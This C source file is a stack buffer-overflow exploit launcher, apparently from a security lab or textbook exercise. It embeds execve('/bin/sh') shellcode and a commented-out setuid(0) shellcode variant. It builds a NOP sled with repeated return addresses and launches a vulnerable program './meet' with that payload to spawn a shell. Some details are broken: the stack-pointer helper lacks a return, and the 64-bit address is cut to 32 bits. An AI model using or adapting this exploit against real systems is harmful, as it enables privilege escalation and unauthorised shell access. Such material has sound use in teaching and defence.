#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

char shellcode[] =  "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05";
/*"\x31\xc0\x31\xdb\xb0\x17\xcd\x80" //setuid(0) first
		    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
		    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
		    "\x80\xe8\xdc\xff\xff\xff/bin/sh";*/


//small function to retrieve the current esp value(locally)

unsigned long get_sp(void) {
    __asm__("mov %rsp, %rax");
}

int main(int argc, char *argv[1]) { 
    int i, offset = 0;
    unsigned int esp, ret, *addr_ptr;
    char *buffer, *ptr;
    int size = 200;

    esp = get_sp();
    if (argc > 1) size = atoi(argv[1]);
    if (argc > 2) offset = atoi(argv[2]);
    if (argc > 3) esp = strtoul(argv[3], NULL, 0); //for remote exploits
    ret = esp - offset; //calc default value of return

    //print directions for usefprintf(stderr, "Usage: %s <buff_size> <offset> <esp: 0xfff...>\n", argv[0]);

    fprintf(stderr,"ESP: 0x%x Offset: 0x%x, return: 0x%x\n", esp, offset, ret);
    buffer = (char*)malloc(size); //allocate buffer on heap
    ptr = buffer; // temp pointer, set to location of buffer
    addr_ptr = (unsigned int *) ptr; //temp addr_ptr set to location of ptr
    //fill entire buffer with return addresses, ensures proper alignment
    for (i = 0; i < size; i +=4) {
	*(addr_ptr++) = ret; //use addr_ptr to write into buffer
    }
    //fill first half  of exploit with NOPs
    for (i=0; i<size/2; i++) {
	buffer[i] = '\x90'; //placing nops
    } 
    //now place the shellcode
    ptr = buffer + size/2;
    for(i=0; i < strlen(shellcode); i++) {
	*(ptr++) = shellcode[i]; //write shellcode into buffer
    }
    //terminate the string
    buffer[size-1]=0; //this is so our buffer ends with a x\0

    //Now call the vurnerable program with the buffer as the  second argument
    execl("./meet", "meet", "MR.", buffer, 0);  //the list of args is ended with w\0
    
    printf("%s\n", buffer);

    free(buffer);
    return 0;
}

